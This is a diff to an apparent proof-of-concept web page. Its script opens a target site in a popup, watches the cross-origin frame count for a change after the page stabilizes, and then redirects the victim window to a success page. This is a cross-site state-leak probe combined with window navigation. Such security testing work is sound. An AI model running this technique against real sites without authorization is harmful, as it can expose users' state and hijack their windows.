@@ -48,25 +48,54 @@
     </div>
 
     <script>
+window.onload = function () {
+    const urlParams = new URLSearchParams(window.location.search);
+    if (urlParams.has('success')) {
+        document.getElementById('mainView').classList.add('hidden');
+        document.getElementById('successView').classList.remove('hidden');
+        document.body.style.backgroundColor = "#fff5f5";
+    }
+};
+
 function runPoC() {
-    const target = document.getElementById('targetUrl').value;
+    const target = document.getElementById('targetUrl').value.trim();
     const statusDiv = document.getElementById('status');
+
     const currentUrl = window.location.href.split('?')[0];
     const successUrl = currentUrl + "?success=true";
 
-    const victimWindow = window.open(target, 'testWindow', 'width=1000,height=700,noopener=no');
-    if (!victimWindow) {
-        statusDiv.innerText = "Popup blocked.";
+    if (!/^https?:\/\//i.test(target)) {
+        alert("Please enter a valid URL including http:// or https://");
         return;
     }
 
-    let armed = false;
-    let stableCount = 0;
-    let lastFrames = null;
-    let userGestureObserved = false;
+    statusDiv.style.backgroundColor = "#e8f0fe";
+    statusDiv.style.color = "#1a73e8";
+    statusDiv.innerText = "Opening target...";
+
+    const victimWindow = window.open(
+        target,
+        "testWindow",
+        "width=1000,height=700,noopener=no"
+    );
+
+    if (!victimWindow) {
+        statusDiv.style.backgroundColor = "#fff0f0";
+        statusDiv.style.color = "#d93025";
+        statusDiv.innerText = "Error: Popup blocked. Allow popups and try again.";
+        return;
+    }
+
+    let phase = "stabilizing";
+    let stableReads = 0;
+    let lastFrameCount = null;
+    let baselineFrameCount = null;
     let monitorStopped = false;
 
-    statusDiv.innerText = "Waiting for popup to stabilize...";
+    const REQUIRED_STABLE_READS = 8; // 8 * 500ms = about 4 seconds stable
+    const POLL_MS = 500;
+    const MAX_RUNTIME_MS = 60000; // stop after 60s
+    const startTime = Date.now();
 
     const check = setInterval(() => {
         if (monitorStopped) {
@@ -74,57 +103,100 @@ function runPoC() {
             return;
         }
 
-        if (!victimWindow || victimWindow.closed) {
+        if (Date.now() - startTime > MAX_RUNTIME_MS) {
+            monitorStopped = true;
             clearInterval(check);
-            statusDiv.innerText = "Popup closed.";
+            statusDiv.style.backgroundColor = "#fff8e1";
+            statusDiv.style.color = "#8a6d3b";
+            statusDiv.innerText = "Timed out waiting for a post-stabilization frame change.";
+            return;
+        }
+
+        if (!victimWindow || victimWindow.closed) {
+            monitorStopped = true;
+            clearInterval(check);
+            statusDiv.style.backgroundColor = "#fff0f0";
+            statusDiv.style.color = "#d93025";
+            statusDiv.innerText = "Popup was closed.";
             return;
         }
 
         try {
-            const currentFrames = victimWindow.frames.length;
+            const currentFrameCount = victimWindow.frames.length;
 
-            if (!armed) {
-                if (lastFrames === currentFrames) {
-                    stableCount++;
+            if (phase === "stabilizing") {
+                if (lastFrameCount === null) {
+                    lastFrameCount = currentFrameCount;
+                    stableReads = 1;
+                    statusDiv.style.backgroundColor = "#e8f0fe";
+                    statusDiv.style.color = "#1a73e8";
+                    statusDiv.innerText = `Stabilizing... current frame count: ${currentFrameCount}`;
+                    return;
+                }
+
+                if (currentFrameCount === lastFrameCount) {
+                    stableReads += 1;
                 } else {
-                    stableCount = 0;
+                    stableReads = 1;
+                    lastFrameCount = currentFrameCount;
                 }
 
-                lastFrames = currentFrames;
+                statusDiv.style.backgroundColor = "#e8f0fe";
+                statusDiv.style.color = "#1a73e8";
+                statusDiv.innerText =
+                    `Stabilizing... frame count ${currentFrameCount} ` +
+                    `(${stableReads}/${REQUIRED_STABLE_READS} stable reads)`;
 
-                if (stableCount >= 5) {
-                    armed = true;
-                    statusDiv.innerText = "Popup stabilized. Waiting for user-triggered change...";
+                if (stableReads >= REQUIRED_STABLE_READS) {
+                    baselineFrameCount = currentFrameCount;
+                    phase = "armed";
+                    statusDiv.style.backgroundColor = "#e8f0fe";
+                    statusDiv.style.color = "#1a73e8";
+                    statusDiv.innerText =
+                        `Baseline locked at ${baselineFrameCount}. ` +
+                        `Waiting for a later frame-count change...`;
                 }
+
                 return;
             }
 
-            // Only detect after a user gesture has been observed
-            if (!userGestureObserved) {
-                statusDiv.innerText = "Armed, but waiting for user interaction...";
-                return;
-            }
+            if (phase === "armed") {
+                if (currentFrameCount !== baselineFrameCount) {
+                    monitorStopped = true;
+                    clearInterval(check);
 
-            if (currentFrames !== lastFrames) {
-                clearInterval(check);
-                statusDiv.innerText = "Post-click state change observed.";
-                victimWindow.location.href = successUrl;
-                return;
-            }
+                    statusDiv.style.backgroundColor = "#fff8e1";
+                    statusDiv.style.color = "#8a6d3b";
+                    statusDiv.innerText =
+                        `Observed post-stabilization frame change: ` +
+                        `${baselineFrameCount} -> ${currentFrameCount}`;
 
-            lastFrames = currentFrames;
+                    try {
+                        victimWindow.location.href = successUrl;
+                    } catch (e) {
+                        console.log("Could not redirect popup after detection:", e);
+                    }
+
+                    return;
+                }
+
+                statusDiv.style.backgroundColor = "#e8f0fe";
+                statusDiv.style.color = "#1a73e8";
+                statusDiv.innerText =
+                    `Armed. Baseline frame count ${baselineFrameCount}; no change yet.`;
+            }
         } catch (e) {
-            if (armed && userGestureObserved) {
-                clearInterval(check);
-                statusDiv.innerText = "Post-click access change observed.";
-            }
-        }
-    }, 500);
+            monitorStopped = true;
+            clearInterval(check);
 
-    document.getElementById('markClick').onclick = () => {
-        userGestureObserved = true;
-        statusDiv.innerText = "User click registered. Monitoring for resulting change...";
-    };
+            statusDiv.style.backgroundColor = "#fff8e1";
+            statusDiv.style.color = "#8a6d3b";
+            statusDiv.innerText =
+                "Popup became inaccessible while monitoring. That is a different signal than frame-count change.";
+
+            console.log("Access changed:", e);
+        }
+    }, POLL_MS);
 }
 </script>
 </body>
